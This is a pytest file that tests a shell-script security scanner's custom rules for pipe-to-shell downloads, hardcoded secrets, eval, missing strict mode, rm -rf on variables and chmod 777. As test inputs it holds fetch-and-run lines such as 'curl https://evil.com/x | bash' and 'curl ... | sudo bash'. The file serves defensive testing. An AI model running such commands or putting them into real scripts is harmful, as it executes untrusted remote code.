"""Tests for the shieldctl-bash custom shell security rules SH-001 to SH-006."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from shieldctl.models import Severity
from shieldctl.scanners.bash import BashScanner


def _make_script(tmp_path: Path, content: str, name: str = "script.sh") -> Path:
    f = tmp_path / name
    f.write_text(content)
    return f


def _mock_shellcheck_empty():
    proc = MagicMock()
    proc.stdout = "[]"
    proc.returncode = 0
    return proc


def _custom_findings(tmp_path: Path, content: str):
    f = _make_script(tmp_path, content)
    scanner = BashScanner()
    with patch.object(scanner, "_exec", return_value=_mock_shellcheck_empty()):
        return [x for x in scanner.run([f]) if x.scanner == "shieldctl-bash"]


# ── SH-001: curl/wget piped to shell ─────────────────────────────────────────

def test_sh001_curl_pipe_bash(tmp_path):
    findings = _custom_findings(tmp_path, "curl https://example.com/install.sh | bash\n")
    assert any(f.rule == "SH-001" for f in findings)
    assert any(f.severity == Severity.HIGH for f in findings if f.rule == "SH-001")


def test_sh001_wget_pipe_sh(tmp_path):
    findings = _custom_findings(tmp_path, "wget -qO- https://get.example.com | sh\n")
    assert any(f.rule == "SH-001" for f in findings)


def test_sh001_curl_pipe_python(tmp_path):
    findings = _custom_findings(tmp_path, "curl https://example.com/setup.py | python3\n")
    assert any(f.rule == "SH-001" for f in findings)


def test_sh001_curl_pipe_sudo_bash(tmp_path):
    findings = _custom_findings(tmp_path, "curl https://example.com/setup.sh | sudo bash\n")
    assert any(f.rule == "SH-001" for f in findings)


def test_sh001_clean_download_and_execute_separately(tmp_path):
    src = "curl -O https://example.com/script.sh\nchmod +x script.sh\n./script.sh\n"
    findings = _custom_findings(tmp_path, src)
    assert not any(f.rule == "SH-001" for f in findings)


# ── SH-002: hardcoded credentials ────────────────────────────────────────────

def test_sh002_hardcoded_password(tmp_path):
    findings = _custom_findings(tmp_path, "PASSWORD='supersecret'\n")
    assert any(f.rule == "SH-002" for f in findings)
    assert any(f.severity == Severity.HIGH for f in findings if f.rule == "SH-002")


def test_sh002_hardcoded_token(tmp_path):
    findings = _custom_findings(tmp_path, 'TOKEN="example_test_token_value"\n')
    assert any(f.rule == "SH-002" for f in findings)


def test_sh002_hardcoded_api_key(tmp_path):
    findings = _custom_findings(tmp_path, "api_key='example_api_key_value'\n")
    assert any(f.rule == "SH-002" for f in findings)


def test_sh002_clean_env_var_reference(tmp_path):
    findings = _custom_findings(tmp_path, "PASSWORD=$SECRET_PASSWORD\n")
    assert not any(f.rule == "SH-002" for f in findings)


def test_sh002_clean_empty_assignment(tmp_path):
    # Very short value (< 4 chars) shouldn't trigger
    findings = _custom_findings(tmp_path, "password=''\n")
    assert not any(f.rule == "SH-002" for f in findings)


# ── SH-003: eval with variable ────────────────────────────────────────────────

def test_sh003_eval_variable(tmp_path):
    findings = _custom_findings(tmp_path, "eval \"$cmd\"\n")
    assert any(f.rule == "SH-003" for f in findings)
    assert any(f.severity == Severity.MEDIUM for f in findings if f.rule == "SH-003")


def test_sh003_eval_subshell(tmp_path):
    findings = _custom_findings(tmp_path, "eval $(generate_cmd)\n")
    assert any(f.rule == "SH-003" for f in findings)


def test_sh003_clean_eval_literal(tmp_path):
    findings = _custom_findings(tmp_path, "eval 'echo hello'\n")
    assert not any(f.rule == "SH-003" for f in findings)


# ── SH-004: missing set -euo pipefail ────────────────────────────────────────

def test_sh004_missing_set_e(tmp_path):
    findings = _custom_findings(tmp_path, "#!/bin/bash\necho hello\nrm -rf /tmp/old\n")
    assert any(f.rule == "SH-004" for f in findings)
    assert any(f.severity == Severity.LOW for f in findings if f.rule == "SH-004")


def test_sh004_clean_has_set_e(tmp_path):
    findings = _custom_findings(tmp_path, "#!/bin/bash\nset -e\necho hello\n")
    assert not any(f.rule == "SH-004" for f in findings)


def test_sh004_clean_has_set_euo_pipefail(tmp_path):
    findings = _custom_findings(tmp_path, "#!/bin/bash\nset -euo pipefail\necho hello\n")
    assert not any(f.rule == "SH-004" for f in findings)


def test_sh004_empty_file_not_flagged(tmp_path):
    findings = _custom_findings(tmp_path, "")
    assert not any(f.rule == "SH-004" for f in findings)


# ── SH-005: rm -rf with variable path ────────────────────────────────────────

def test_sh005_rm_rf_variable(tmp_path):
    findings = _custom_findings(tmp_path, "rm -rf $TARGET_DIR\n")
    assert any(f.rule == "SH-005" for f in findings)
    assert any(f.severity == Severity.MEDIUM for f in findings if f.rule == "SH-005")


def test_sh005_rm_rf_variable_braces(tmp_path):
    findings = _custom_findings(tmp_path, "rm -rf ${BUILD_DIR}/output\n")
    assert any(f.rule == "SH-005" for f in findings)


def test_sh005_clean_rm_rf_literal(tmp_path):
    findings = _custom_findings(tmp_path, "rm -rf /tmp/build\n")
    assert not any(f.rule == "SH-005" for f in findings)


# ── SH-006: chmod 777 ────────────────────────────────────────────────────────

def test_sh006_chmod_777(tmp_path):
    findings = _custom_findings(tmp_path, "chmod 777 /app/data\n")
    assert any(f.rule == "SH-006" for f in findings)
    assert any(f.severity == Severity.MEDIUM for f in findings if f.rule == "SH-006")


def test_sh006_chmod_o_rwx(tmp_path):
    # Only catches octal 777 form; other forms left to shellcheck
    findings = _custom_findings(tmp_path, "chmod 755 /app/bin\n")
    assert not any(f.rule == "SH-006" for f in findings)


def test_sh006_clean_chmod_755(tmp_path):
    findings = _custom_findings(tmp_path, "chmod 755 /app/bin\n")
    assert not any(f.rule == "SH-006" for f in findings)


# ── Integration: shellcheck findings still present ───────────────────────────

def test_shellcheck_and_custom_rules_both_run(tmp_path):
    f = _make_script(tmp_path, "PASSWORD='secret123'\necho hello\n")
    scanner = BashScanner()
    sc_finding = MagicMock()
    sc_finding.stdout = json.dumps([
        {"code": 2034, "level": "warning", "line": 2, "message": "var unused"}
    ])
    sc_finding.returncode = 0
    with patch.object(scanner, "_exec", return_value=sc_finding):
        findings = scanner.run([f])
    scanners = {x.scanner for x in findings}
    assert "shellcheck" in scanners
    assert "shieldctl-bash" in scanners


# ── Custom rules line numbers ─────────────────────────────────────────────────

def test_custom_rule_reports_correct_line_number(tmp_path):
    src = "#!/bin/bash\nset -e\n# comment\ncurl https://evil.com/x | bash\n"
    findings = _custom_findings(tmp_path, src)
    sh001 = [f for f in findings if f.rule == "SH-001"]
    assert len(sh001) == 1
    assert sh001[0].line == 4
